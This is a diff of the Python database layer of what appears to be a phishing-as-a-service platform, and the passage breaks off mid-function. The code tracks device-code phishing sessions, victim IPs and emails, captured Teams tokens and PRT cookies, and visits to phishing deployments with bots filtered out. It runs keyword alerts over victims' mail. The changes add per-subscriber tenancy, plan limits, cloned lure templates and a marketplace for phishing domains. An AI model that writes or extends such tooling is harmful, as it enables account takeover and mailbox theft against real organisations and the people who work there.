@@ -5,7 +5,9 @@ import json
 import base64
 import time
 import secrets
+import re
 from werkzeug.security import generate_password_hash, check_password_hash
+from datetime import datetime, timedelta
 from config import Config
 
 logger = logging.getLogger(__name__)
@@ -40,7 +42,8 @@ def init_db():
     
     new_cols = [
         ('teams_token', 'TEXT'), ('prt_cookie', 'TEXT'), 
-        ('access_token_expiry', 'INTEGER'), ('refresh_token_expiry', 'INTEGER')
+        ('access_token_expiry', 'INTEGER'), ('refresh_token_expiry', 'INTEGER'),
+        ('owner_id', 'INTEGER')
     ]
     for col, dtype in new_cols:
         try:
@@ -64,6 +67,61 @@ def init_db():
             ('Outlook Security Alert', 'Outlook', '📧'),
             ('Azure MFA Prompt', 'Azure', '🔐')])
         
+    # ── Tenant isolation: templates and pre-land templates are partitioned per tenant ──
+    try:
+        cursor.execute("ALTER TABLE templates ADD COLUMN owner_id INTEGER")
+    except sqlite3.OperationalError: pass
+    try:
+        cursor.execute("ALTER TABLE preland_templates ADD COLUMN owner_id INTEGER")
+    except sqlite3.OperationalError: pass
+    # ── Legacy UNIQUE(name) rebuild: SQLite cannot drop inline UNIQUE constraints,
+    # so per-tenant template copies require a one-time table rebuild. Idempotent.
+    for _t in ('templates', 'preland_templates'):
+        _row = cursor.execute("SELECT sql FROM sqlite_master WHERE type='table' AND name=?", (_t,)).fetchone()
+        if not _row or not _row[0] or 'UNIQUE' not in _row[0].upper():
+            continue
+        _cols = [(r[1], r[2], r[3], r[4], r[5]) for r in cursor.execute(f"PRAGMA table_info({_t})").fetchall()]
+        _defs = []
+        for _name, _type, _notnull, _dflt, _pk in _cols:
+            _type = _type or 'TEXT'
+            _line = f'"{_name}" {_type}'
+            if _pk:
+                _line = f'"{_name}" INTEGER PRIMARY KEY'
+            if _notnull:
+                _line += ' NOT NULL'
+            if _dflt is not None:
+                _line += f' DEFAULT {_dflt}'
+            _defs.append(_line)
+        _col_names = ', '.join(f'"{n}"' for n, _, _, _, _ in _cols)
+        cursor.execute(f"CREATE TABLE {_t}_mig ({', '.join(_defs)})")
+        cursor.execute(f"INSERT INTO {_t}_mig ({_col_names}) SELECT {_col_names} FROM {_t}")
+        cursor.execute(f"DROP TABLE {_t}")
+        cursor.execute(f"ALTER TABLE {_t}_mig RENAME TO {_t}")
+    conn.commit()
+
+    # ── Domain marketplace tenancy: owner partitions + sellable inventory ──
+    # owner_id NULL + for_sale=0  → master's own usable domains
+    # owner_id NULL + for_sale=1  → marketplace inventory (buyable by clients)
+    # owner_id = client_id        → that tenant's private domains
+    for _col, _dflt in (('owner_id', 'INTEGER'), ('for_sale', 'INTEGER DEFAULT 0'), ('price', 'TEXT')):
+        try:
+            cursor.execute(f"ALTER TABLE owned_domains ADD COLUMN {_col} {_dflt}")
+        except sqlite3.OperationalError: pass
+    try:
+        cursor.execute("ALTER TABLE owned_domains ADD COLUMN pending_client_id INTEGER")
+    except sqlite3.OperationalError: pass
+    # Legacy adoption: domains previously assigned via client_domain_assignments
+    # become the client's property and leave the master pool entirely.
+    try:
+        cursor.execute("""UPDATE owned_domains SET owner_id = (
+                              SELECT a.client_id FROM client_domain_assignments a
+                              WHERE a.domain = owned_domains.domain
+                              ORDER BY a.id LIMIT 1)
+                          WHERE domain IN (SELECT DISTINCT domain FROM client_domain_assignments)""")
+        conn.commit()
+    except sqlite3.OperationalError: pass
+    conn.commit()
+    
     cursor.execute('''CREATE TABLE IF NOT EXISTS b2b_campaigns (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         name TEXT,
@@ -84,6 +142,11 @@ def init_db():
 
     try:
         cursor.execute("ALTER TABLE b2b_campaigns ADD COLUMN send_mode TEXT DEFAULT 'direct'")
+    except sqlite3.OperationalError: pass
+
+    # ── Tenant isolation: B2B campaigns are partitioned per client subscriber ──
+    try:
+        cursor.execute("ALTER TABLE b2b_campaigns ADD COLUMN owner_id INTEGER")
     except sqlite3.OperationalError: pass
 
     # ── Phase 1: Pre-Land template library ──────────────────────────────────
@@ -149,12 +212,15 @@ def init_db():
     try:
         cursor.execute("ALTER TABLE deployments ADD COLUMN bot_hits INTEGER DEFAULT 0")
     except sqlite3.OperationalError: pass
+    try:
+        cursor.execute("ALTER TABLE deployments ADD COLUMN owner_id INTEGER")
+    except sqlite3.OperationalError: pass
 
     # ── Phase 1: Owned domains ───────────────────────────────────────────────
     cursor.execute('''CREATE TABLE IF NOT EXISTS owned_domains (
         id          INTEGER PRIMARY KEY AUTOINCREMENT,
         domain      TEXT UNIQUE NOT NULL,
-        registrar   TEXT DEFAULT 'namecheap',
+        registrar   TEXT DEFAULT 'dynadot',
         expiry_date TEXT,
         ns_configured INTEGER DEFAULT 0,        -- 1 once NS points to our server
         auto_renew  INTEGER DEFAULT 1,
@@ -232,6 +298,10 @@ def init_db():
         created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )''')
 
+    try:
+        cursor.execute("ALTER TABLE keyword_rules ADD COLUMN owner_id INTEGER")
+    except sqlite3.OperationalError: pass
+
     cursor.execute('''CREATE TABLE IF NOT EXISTS keyword_matches (
         id                  INTEGER PRIMARY KEY AUTOINCREMENT,
         rule_id             INTEGER REFERENCES keyword_rules(id) ON DELETE SET NULL,
@@ -294,7 +364,12 @@ def init_db():
         ('bound_ip', 'TEXT'),
         ('bound_device_info', 'TEXT'),
         ('active_session_nonce', 'TEXT'),
-        ('sharing_violations_count', 'INTEGER DEFAULT 0')
+        ('sharing_violations_count', 'INTEGER DEFAULT 0'),
+        ('account_type', "TEXT DEFAULT 'operator'"),
+        ('subscription_expires_at', 'TIMESTAMP'),
+        ('plan_name', "TEXT DEFAULT 'Pro'"),
+        ('max_deployments', 'INTEGER DEFAULT 10'),
+        ('portal_slug', 'TEXT')
     ]
     for col, dtype in new_op_cols:
         try:
@@ -305,6 +380,14 @@ def init_db():
     cursor.execute("SELECT id FROM operators WHERE token IS NULL OR token = ''")
     for r in cursor.fetchall():
         cursor.execute("UPDATE operators SET token = ? WHERE id = ?", (secrets.token_hex(6), r[0]))
+
+    cursor.execute('''CREATE TABLE IF NOT EXISTS client_domain_assignments (
+        id          INTEGER PRIMARY KEY AUTOINCREMENT,
+        client_id   INTEGER NOT NULL REFERENCES operators(id) ON DELETE CASCADE,
+        domain      TEXT NOT NULL,
+        assigned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        UNIQUE(client_id, domain)
+    )''')
 
     cursor.execute('''CREATE TABLE IF NOT EXISTS operator_assignments (
         id                INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -363,12 +446,12 @@ def init_db():
     conn.close()
 
 
-def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A"):
+def create_session(user_code, device_code, verification_uri, template_id, phishing_url, client_ip="N/A", user_agent="N/A", owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
     try:
-        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status)
-            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING')''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent))
+        cursor.execute('''INSERT INTO sessions (user_code, device_code, verification_uri, template_id, phishing_url, victim_ip, victim_browser, status, owner_id)
+            VALUES (?, ?, ?, ?, ?, ?, ?, 'PENDING', ?)''', (user_code, device_code, verification_uri, template_id, phishing_url, client_ip, user_agent, owner_id))
         conn.commit()
         return cursor.lastrowid
     except sqlite3.IntegrityError: return None
@@ -436,17 +519,23 @@ def delete_session(user_code):
     conn.commit()
     conn.close()
 
-def delete_all_sessions():
+def delete_all_sessions(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
-    cursor.execute('DELETE FROM sessions')
+    if owner_id is not None:
+        cursor.execute('DELETE FROM sessions WHERE owner_id = ?', (owner_id,))
+    else:
+        cursor.execute('DELETE FROM sessions')
     conn.commit()
     conn.close()
 
-def purge_inactive_sessions():
+def purge_inactive_sessions(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
-    cursor.execute("DELETE FROM sessions WHERE status != 'CAPTURED'")
+    if owner_id is not None:
+        cursor.execute("DELETE FROM sessions WHERE status != 'CAPTURED' AND owner_id = ?", (owner_id,))
+    else:
+        cursor.execute("DELETE FROM sessions WHERE status != 'CAPTURED'")
     deleted = cursor.rowcount
     conn.commit()
     conn.close()
@@ -462,30 +551,49 @@ def get_pending_sessions():
     finally:
         conn.close()
 
-def get_all_sessions():
+def get_all_sessions(owner_id=None, admin_only=False):
     conn = sqlite3.connect(Config.DB_PATH)
     try:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
-        cursor.execute('''
-            SELECT s.*, t.name as template_name, t.service as template_service 
-            FROM sessions s 
-            LEFT JOIN templates t ON s.template_id = t.id 
-            ORDER BY s.created_at DESC
-        ''')
+        if owner_id is not None:
+            cursor.execute('''
+                SELECT s.*, t.name as template_name, t.service as template_service 
+                FROM sessions s 
+                LEFT JOIN templates t ON s.template_id = t.id 
+                WHERE s.owner_id = ?
+                ORDER BY s.created_at DESC
+            ''', (owner_id,))
+        elif admin_only:
+            cursor.execute('''
+                SELECT s.*, t.name as template_name, t.service as template_service 
+                FROM sessions s 
+                LEFT JOIN templates t ON s.template_id = t.id 
+                WHERE s.owner_id IS NULL
+                ORDER BY s.created_at DESC
+            ''')
+        else:
+            cursor.execute('''
+                SELECT s.*, t.name as template_name, t.service as template_service 
+                FROM sessions s 
+                LEFT JOIN templates t ON s.template_id = t.id 
+                ORDER BY s.created_at DESC
+            ''')
         raw_sessions = [dict(row) for row in cursor.fetchall()]
     finally:
         conn.close()
 
-    # De-duplicate sessions by victim_email (keep newest session per account)
-    seen_emails = set()
+    # De-duplicate sessions by (owner_id, victim_email) so one tenant's capture never silences another's
+    seen_keys = set()
     deduped = []
     for s in raw_sessions:
         email = (s.get('victim_email') or '').strip().lower()
+        owner = s.get('owner_id')
         if email and email != 'unknown':
-            if email in seen_emails:
+            key = (owner, email)
+            if key in seen_keys:
                 continue
-            seen_emails.add(email)
+            seen_keys.add(key)
         deduped.append(s)
     return deduped
 
@@ -493,13 +601,44 @@ def get_captured_sessions():
     """Returns all captured victim sessions."""
     return [s for s in get_all_sessions() if s.get('status') == 'CAPTURED']
 
-def get_templates():
+def get_templates(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     try:
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
-        cursor.execute('SELECT * FROM templates ORDER BY service, name')
+        if owner_id is not None:
+            cursor.execute('SELECT * FROM templates WHERE owner_id = ? ORDER BY service, name', (owner_id,))
+        else:
+            cursor.execute('SELECT * FROM templates WHERE owner_id IS NULL ORDER BY service, name')
         return [dict(row) for row in cursor.fetchall()]
+    finally:
+        conn.close()
+
+def clone_master_template_catalog(client_id):
+    """Seed a new client tenant with private copies of the master (unowned)
+    template catalog — landing templates and pre-land templates. Each tenant's
+    catalog is fully isolated: master edits/deletes never affect client copies
+    and vice versa. Returns the number of cloned rows."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cloned = 0
+    try:
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        for table in ('templates', 'preland_templates'):
+            rows = cursor.execute(f"SELECT * FROM {table} WHERE owner_id IS NULL").fetchall()
+            for row in rows:
+                d = dict(row)
+                d.pop('id', None)
+                d['owner_id'] = client_id
+                cols = ', '.join(d.keys())
+                qs = ', '.join('?' for _ in d)
+                cursor.execute(f"INSERT INTO {table} ({cols}) VALUES ({qs})", tuple(d.values()))
+                cloned += 1
+        conn.commit()
+        return cloned
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Template catalog clone failed: {e}")
+        return cloned
     finally:
         conn.close()
 
@@ -514,35 +653,9 @@ def get_session_by_user_code(user_code):
     finally:
         conn.close()
 
-def get_statistics():
+def get_statistics(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
-    cursor.execute("SELECT COUNT(*) FROM sessions"); total = cursor.fetchone()[0]
-    cursor.execute("""
-        SELECT COUNT(DISTINCT CASE 
-            WHEN victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown' 
-            THEN LOWER(TRIM(victim_email)) 
-            ELSE user_code 
-        END) FROM sessions WHERE status = 'CAPTURED' AND ((victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown') OR (victim_name IS NOT NULL AND TRIM(victim_name) != ''))
-    """)
-    captured = cursor.fetchone()[0]
-    cursor.execute("""
-        SELECT COUNT(DISTINCT LOWER(TRIM(victim_email))) 
-        FROM sessions 
-        WHERE status = 'REVOKED' 
-          AND victim_email IS NOT NULL 
-          AND TRIM(victim_email) != '' 
-          AND LOWER(TRIM(victim_email)) != 'unknown'
-    """)
-    revoked = cursor.fetchone()[0]
-    cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'PENDING'"); pending = cursor.fetchone()[0]
-    cursor.execute("""
-        SELECT COUNT(*) FROM sessions 
-        WHERE status = 'EXPIRED' 
-           OR (status = 'PENDING' AND (strftime('%s', 'now') - strftime('%s', created_at)) > 900)
-    """)
-    incomplete = cursor.fetchone()[0]
-    cursor.execute("SELECT COUNT(DISTINCT template_id) FROM sessions"); templates = cursor.fetchone()[0]
     
     total_visits = 0
     today_visits = 0
@@ -550,21 +663,99 @@ def get_statistics():
     bot_visits = 0
     today_human_visits = 0
     today_bot_visits = 0
-    try:
-        cursor.execute("SELECT COUNT(*) FROM deployment_hits")
-        total_visits = cursor.fetchone()[0]
-        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE date(hit_at) = date('now')")
-        today_visits = cursor.fetchone()[0]
-        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 0")
-        human_visits = cursor.fetchone()[0]
-        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 1")
-        bot_visits = cursor.fetchone()[0]
-        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 0 AND date(hit_at) = date('now')")
-        today_human_visits = cursor.fetchone()[0]
-        cursor.execute("SELECT COUNT(*) FROM deployment_hits WHERE is_bot = 1 AND date(hit_at) = date('now')")
-        today_bot_visits = cursor.fetchone()[0]
-    except Exception:
-        pass
+
+    if owner_id is not None:
+        cursor.execute("SELECT COUNT(*) FROM sessions WHERE owner_id = ?", (owner_id,))
+        total = cursor.fetchone()[0]
+        cursor.execute("""
+            SELECT COUNT(DISTINCT CASE 
+                WHEN victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown' 
+                THEN LOWER(TRIM(victim_email)) 
+                ELSE user_code 
+            END) FROM sessions 
+            WHERE status = 'CAPTURED' AND owner_id = ?
+              AND ((victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown') OR (victim_name IS NOT NULL AND TRIM(victim_name) != ''))
+        """, (owner_id,))
+        captured = cursor.fetchone()[0]
+        cursor.execute("""
+            SELECT COUNT(DISTINCT LOWER(TRIM(victim_email))) 
+            FROM sessions 
+            WHERE status = 'REVOKED' AND owner_id = ?
+              AND victim_email IS NOT NULL 
+              AND TRIM(victim_email) != '' 
+              AND LOWER(TRIM(victim_email)) != 'unknown'
+        """, (owner_id,))
+        revoked = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'PENDING' AND owner_id = ?", (owner_id,))
+        pending = cursor.fetchone()[0]
+        cursor.execute("""
+            SELECT COUNT(*) FROM sessions 
+            WHERE owner_id = ? AND (status = 'EXPIRED' 
+               OR (status = 'PENDING' AND (strftime('%s', 'now') - strftime('%s', created_at)) > 900))
+        """, (owner_id,))
+        incomplete = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(DISTINCT template_id) FROM sessions WHERE owner_id = ?", (owner_id,))
+        templates = cursor.fetchone()[0]
+
+        try:
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id = ?", (owner_id,))
+            total_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id = ? AND date(dh.hit_at) = date('now')", (owner_id,))
+            today_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id = ? AND dh.is_bot = 0", (owner_id,))
+            human_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id = ? AND dh.is_bot = 1", (owner_id,))
+            bot_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id = ? AND dh.is_bot = 0 AND date(dh.hit_at) = date('now')", (owner_id,))
+            today_human_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id = ? AND dh.is_bot = 1 AND date(dh.hit_at) = date('now')", (owner_id,))
+            today_bot_visits = cursor.fetchone()[0]
+        except Exception:
+            pass
+    else:
+        cursor.execute("SELECT COUNT(*) FROM sessions WHERE owner_id IS NULL"); total = cursor.fetchone()[0]
+        cursor.execute("""
+            SELECT COUNT(DISTINCT CASE 
+                WHEN victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown' 
+                THEN LOWER(TRIM(victim_email)) 
+                ELSE user_code 
+            END) FROM sessions WHERE status = 'CAPTURED' AND owner_id IS NULL AND ((victim_email IS NOT NULL AND TRIM(victim_email) != '' AND LOWER(TRIM(victim_email)) != 'unknown') OR (victim_name IS NOT NULL AND TRIM(victim_name) != ''))
+        """)
+        captured = cursor.fetchone()[0]
+        cursor.execute("""
+            SELECT COUNT(DISTINCT LOWER(TRIM(victim_email))) 
+            FROM sessions 
+            WHERE status = 'REVOKED' AND owner_id IS NULL
+              AND victim_email IS NOT NULL 
+              AND TRIM(victim_email) != '' 
+              AND LOWER(TRIM(victim_email)) != 'unknown'
+        """)
+        revoked = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'PENDING' AND owner_id IS NULL"); pending = cursor.fetchone()[0]
+        cursor.execute("""
+            SELECT COUNT(*) FROM sessions 
+            WHERE owner_id IS NULL AND (status = 'EXPIRED' 
+               OR (status = 'PENDING' AND (strftime('%s', 'now') - strftime('%s', created_at)) > 900))
+        """)
+        incomplete = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(DISTINCT template_id) FROM sessions WHERE owner_id IS NULL"); templates = cursor.fetchone()[0]
+        
+        try:
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id IS NULL")
+            total_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id IS NULL AND date(dh.hit_at) = date('now')")
+            today_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id IS NULL AND dh.is_bot = 0")
+            human_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id IS NULL AND dh.is_bot = 1")
+            bot_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id IS NULL AND dh.is_bot = 0 AND date(dh.hit_at) = date('now')")
+            today_human_visits = cursor.fetchone()[0]
+            cursor.execute("SELECT COUNT(*) FROM deployment_hits dh JOIN deployments d ON d.id = dh.deployment_id WHERE d.owner_id IS NULL AND dh.is_bot = 1 AND date(dh.hit_at) = date('now')")
+            today_bot_visits = cursor.fetchone()[0]
+        except Exception:
+            pass
+
     conn.close()
     return {
         'total_links': total, 
@@ -583,16 +774,24 @@ def get_statistics():
         'today_bot_visits': today_bot_visits
     }
 
-def reset_visitor_statistics():
+def reset_visitor_statistics(owner_id=None):
     """Resets visitor and telemetry hit statistics alone by clearing deployment_hits.
-    Captured victim sessions, tokens, and active campaigns are strictly preserved.
+    Tenant-scoped: owner_id=None resets the MASTER partition only; a client_id resets
+    only that subscriber's hits. Captured victim sessions, tokens, and active
+    campaigns are strictly preserved.
     """
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
     try:
-        cursor.execute("DELETE FROM deployment_hits")
+        if owner_id is None:
+            cursor.execute("""DELETE FROM deployment_hits WHERE deployment_id IN (
+                SELECT id FROM deployments WHERE owner_id IS NULL)""")
+        else:
+            cursor.execute("""DELETE FROM deployment_hits WHERE deployment_id IN (
+                SELECT id FROM deployments WHERE owner_id = ?)""", (owner_id,))
         conn.commit()
-        logger.info("[STATISTICS] Visitor telemetry statistics successfully reset to 0.")
+        scope = 'MASTER' if owner_id is None else f'client {owner_id}'
+        logger.info(f"[STATISTICS] Visitor telemetry statistics reset to 0 for tenant scope: {scope}.")
         return True
     except Exception as e:
         logger.error(f"[STATISTICS] Failed to reset visitor statistics: {e}")
@@ -648,15 +847,21 @@ def get_graph_access_token(session):
     return None
 
 # ── Keyword Alerts DB Operations ─────────────────────────────────────────────
-def get_keyword_rules(active_only=False):
+def get_keyword_rules(active_only=False, owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
     cursor = conn.cursor()
-    query = "SELECT * FROM keyword_rules"
+    query = "SELECT * FROM keyword_rules WHERE 1=1"
+    params = []
     if active_only:
-        query += " WHERE is_active = 1"
+        query += " AND is_active = 1"
+    if owner_id is not None:
+        query += " AND owner_id = ?"
+        params.append(owner_id)
+    else:
+        query += " AND (owner_id IS NULL OR owner_id = 0)"
     query += " ORDER BY id ASC"
-    rows = cursor.execute(query).fetchall()
+    rows = cursor.execute(query, params).fetchall()
     rules = []
     for r in rows:
         d = dict(r)
@@ -683,7 +888,7 @@ def get_keyword_rule(rule_id):
         d['keywords'] = [k.strip() for k in str(d['keywords']).split(',') if k.strip()]
     return d
 
-def add_keyword_rule(name, category, severity, keywords, search_scope='all', target_account='all', notify_telegram=1, notify_webhook=1, is_active=1):
+def add_keyword_rule(name, category, severity, keywords, search_scope='all', target_account='all', notify_telegram=1, notify_webhook=1, is_active=1, owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
     if isinstance(keywords, list):
@@ -691,9 +896,9 @@ def add_keyword_rule(name, category, severity, keywords, search_scope='all', tar
     else:
         keywords_json = json.dumps([k.strip() for k in str(keywords).split(',') if k.strip()])
     cursor.execute('''INSERT INTO keyword_rules 
-        (name, category, severity, keywords, search_scope, target_account, notify_telegram, notify_webhook, is_active)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-        (name, category, severity, keywords_json, search_scope, target_account, int(notify_telegram), int(notify_webhook), int(is_active)))
+        (name, category, severity, keywords, search_scope, target_account, notify_telegram, notify_webhook, is_active, owner_id)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+        (name, category, severity, keywords_json, search_scope, target_account, int(notify_telegram), int(notify_webhook), int(is_active), owner_id))
     conn.commit()
     new_id = cursor.lastrowid
     conn.close()
@@ -797,7 +1002,7 @@ def mark_message_alerted(session_user_code, message_id, received_datetime='', in
     finally:
         conn.close()
 
-def get_keyword_matches(severity=None, target_account=None, rule_id=None, triaged=None, limit=100, offset=0):
+def get_keyword_matches(severity=None, target_account=None, rule_id=None, triaged=None, limit=100, offset=0, owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
     cursor = conn.cursor()
@@ -806,6 +1011,11 @@ def get_keyword_matches(severity=None, target_account=None, rule_id=None, triage
                LEFT JOIN keyword_rules r ON m.rule_id = r.id
                WHERE 1=1'''
     params = []
+    if owner_id is not None:
+        query += " AND (r.owner_id = ? OR m.session_user_code IN (SELECT user_code FROM sessions WHERE owner_id = ?))"
+        params.extend([owner_id, owner_id])
+    else:
+        query += " AND (r.owner_id IS NULL OR r.owner_id = 0)"
     if severity and severity != 'ALL':
         query += " AND r.severity = ?"
         params.append(severity.upper())
@@ -840,26 +1050,86 @@ def delete_keyword_match(match_id):
     conn.close()
     return True
 
-def clear_keyword_matches():
+def clear_keyword_matches(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
-    cursor.execute("DELETE FROM keyword_matches")
+    if owner_id is not None:
+        cursor.execute('''DELETE FROM keyword_matches WHERE
+            id IN (SELECT m.id FROM keyword_matches m
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id
+                LEFT JOIN sessions s ON m.session_user_code = s.user_code
+                WHERE r.owner_id = ? OR s.owner_id = ?)''', (owner_id, owner_id))
+    else:
+        cursor.execute("DELETE FROM keyword_matches")
     conn.commit()
     conn.close()
     return True
 
-def get_keyword_stats():
+def is_session_owned_by_client(client_id, user_code):
+    """True when the given session belongs to the given client tenant (owner_id match)."""
+    if client_id is None:
+        return False
+    conn = sqlite3.connect(Config.DB_PATH)
+    try:
+        row = conn.execute(
+            "SELECT 1 FROM sessions WHERE user_code = ? AND owner_id = ? LIMIT 1",
+            (user_code, client_id)
+        ).fetchone()
+        return bool(row)
+    finally:
+        conn.close()
+
+def is_keyword_match_visible_to_client(client_id, match_id):
+    """True when a keyword match belongs to the given client tenant
+    (via rule ownership or via the owning session), mirroring get_keyword_matches scoping."""
+    if client_id is None:
+        return False
+    conn = sqlite3.connect(Config.DB_PATH)
+    try:
+        row = conn.execute('''SELECT 1 FROM keyword_matches m
+            LEFT JOIN keyword_rules r ON m.rule_id = r.id
+            LEFT JOIN sessions s ON m.session_user_code = s.user_code
+            WHERE m.id = ? AND (r.owner_id = ? OR s.owner_id = ?) LIMIT 1''',
+            (match_id, client_id, client_id)
+        ).fetchone()
+        return bool(row)
+    finally:
+        conn.close()
+
+def get_keyword_stats(owner_id=None):
     conn = sqlite3.connect(Config.DB_PATH)
     cursor = conn.cursor()
     try:
-        rules_count = cursor.execute("SELECT COUNT(*) FROM keyword_rules WHERE is_active = 1").fetchone()[0]
-        total_rules = cursor.execute("SELECT COUNT(*) FROM keyword_rules").fetchone()[0]
-        matches_count = cursor.execute("SELECT COUNT(*) FROM keyword_matches").fetchone()[0]
-        critical_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
-            LEFT JOIN keyword_rules r ON m.rule_id = r.id 
-            WHERE r.severity = 'CRITICAL' ''').fetchone()[0]
-        untriaged_count = cursor.execute("SELECT COUNT(*) FROM keyword_matches WHERE is_triaged = 0").fetchone()[0]
-        victims_count = cursor.execute("SELECT COUNT(DISTINCT session_user_code) FROM keyword_matches").fetchone()[0]
+        if owner_id is not None:
+            rules_count = cursor.execute("SELECT COUNT(*) FROM keyword_rules WHERE is_active = 1 AND owner_id = ?", (owner_id,)).fetchone()[0]
+            total_rules = cursor.execute("SELECT COUNT(*) FROM keyword_rules WHERE owner_id = ?", (owner_id,)).fetchone()[0]
+            matches_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE r.owner_id = ? OR m.session_user_code IN (SELECT user_code FROM sessions WHERE owner_id = ?)''', (owner_id, owner_id)).fetchone()[0]
+            critical_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE r.severity = 'CRITICAL' AND (r.owner_id = ? OR m.session_user_code IN (SELECT user_code FROM sessions WHERE owner_id = ?))''', (owner_id, owner_id)).fetchone()[0]
+            untriaged_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE m.is_triaged = 0 AND (r.owner_id = ? OR m.session_user_code IN (SELECT user_code FROM sessions WHERE owner_id = ?))''', (owner_id, owner_id)).fetchone()[0]
+            victims_count = cursor.execute('''SELECT COUNT(DISTINCT m.session_user_code) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE r.owner_id = ? OR m.session_user_code IN (SELECT user_code FROM sessions WHERE owner_id = ?)''', (owner_id, owner_id)).fetchone()[0]
+        else:
+            rules_count = cursor.execute("SELECT COUNT(*) FROM keyword_rules WHERE is_active = 1 AND (owner_id IS NULL OR owner_id = 0)").fetchone()[0]
+            total_rules = cursor.execute("SELECT COUNT(*) FROM keyword_rules WHERE (owner_id IS NULL OR owner_id = 0)").fetchone()[0]
+            matches_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE r.owner_id IS NULL OR r.owner_id = 0''').fetchone()[0]
+            critical_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE r.severity = 'CRITICAL' AND (r.owner_id IS NULL OR r.owner_id = 0)''').fetchone()[0]
+            untriaged_count = cursor.execute('''SELECT COUNT(*) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE m.is_triaged = 0 AND (r.owner_id IS NULL OR r.owner_id = 0)''').fetchone()[0]
